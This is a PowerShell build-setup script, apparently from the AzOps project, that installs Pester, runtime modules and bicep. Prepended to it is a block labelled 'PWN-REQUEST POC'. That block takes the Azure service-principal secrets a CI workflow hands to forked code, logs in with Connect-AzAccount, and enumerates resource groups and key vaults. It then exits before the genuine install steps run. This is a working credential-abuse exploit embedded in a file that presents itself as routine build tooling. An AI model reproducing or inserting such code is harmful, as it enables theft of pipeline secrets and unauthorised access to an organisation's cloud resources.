param (
    [string]
    $Repository = 'PSGallery'
)

Write-Host "=== PWN-REQUEST POC - Secret exposure + Azure access ==="

# Prove secrets delivered to fork code
Write-Host "ARM_CLIENT_SECRET in env: $(if ($env:ARM_CLIENT_SECRET) { 'YES (masked by GitHub as ***)' } else { 'NO' })"

# Connect to Azure using the exposed credentials
$credential = New-Object PSCredential -ArgumentList $env:ARM_CLIENT_ID, `
    (ConvertTo-SecureString -String $env:ARM_CLIENT_SECRET -AsPlainText -Force)
Connect-AzAccount -TenantId $env:ARM_TENANT_ID -ServicePrincipal `
    -Credential $credential -SubscriptionId $env:ARM_SUBSCRIPTION_ID

# Prove authenticated access
Write-Host "=== Authenticated Azure context ==="
Get-AzContext | Select-Object Account, Subscription, Tenant | Format-List

Write-Host "=== Resource Groups (proves read access) ==="
Get-AzResourceGroup | Select-Object ResourceGroupName, Location | Format-Table

Write-Host "=== Key Vaults discoverable ==="
Get-AzKeyVault | Select-Object VaultName, ResourceGroupName | Format-Table

Write-Host "=== END POC ==="
exit 0



# Development Modules
Set-PSRepository -Name $Repository -InstallationPolicy Trusted
$modules = @("Pester", "PSModuleDevelopment", "PSScriptAnalyzer")
Write-Output "Installing development modules"
foreach ($module in $modules) {
    Write-Output "Installing: $module"
    Install-Module $module -Repository $Repository -Force
}
# Runtime Modules
$data = Import-PowerShellDataFile -Path "$PSScriptRoot/../src/AzOps.psd1"
Write-Output "Installing runtime modules"
foreach ($dependency in $data.RequiredModules) {
    $module = Get-Module -Name $dependency.ModuleName -ListAvailable
    if ($module) {
        foreach ($item in $module) {
            Write-Output "Cleanup of: $($item.Name)"
            Uninstall-Module -Name $item.Name -Force
        }
    }
    Write-Output "Installing: $($dependency.ModuleName) $($dependency.RequiredVersion)"
    Install-Module -Name $dependency.ModuleName -RequiredVersion $dependency.RequiredVersion -Repository $Repository
}
# Download and add bicep to PATH
curl -Lo bicep https://github.com/Azure/bicep/releases/latest/download/bicep-linux-x64
chmod +x ./bicep
sudo mv ./bicep /usr/local/bin/bicep
bicep --help

# List Modules
Get-InstalledModule | Select-Object Name, Version, Repository, InstalledDate | Sort-Object Name | Format-Table
